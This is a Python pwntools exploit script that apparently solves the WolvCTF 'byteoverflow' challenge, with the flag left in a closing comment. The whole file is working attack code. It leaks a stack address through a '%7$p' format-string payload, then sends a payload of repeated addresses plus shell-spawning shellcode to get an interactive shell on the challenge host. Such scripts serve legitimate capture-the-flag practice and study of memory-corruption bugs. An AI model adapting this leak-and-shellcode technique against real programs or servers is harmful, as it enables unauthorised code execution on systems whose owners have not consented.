#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./byteoverflow_patched")
libc = ELF("./libc.6.so")

context.binary = exe

REMOTE_NC_CMD    = " nc byteoverflow.wolvctf.io 1337 "    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *opts+146
c
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    '''
    Keep running until u get a shell :)
    '''

    r.sendline(b"2")

    payload = b"%7$p"
    r.sendline(payload)
    r.recvuntil(b"following: \n")
    leak = int(r.recvline()[:-1], 16) - 544 + 208

   
    shellcode = p64(leak)*26 + asm(shellcraft.sh())
    
    r.sendline(b"1")
    r.send(shellcode+b"\x00")

    r.interactive()
    #wctf{0n3_byT3_i5_4ll_1_n33D}

if __name__ == "__main__":
    main()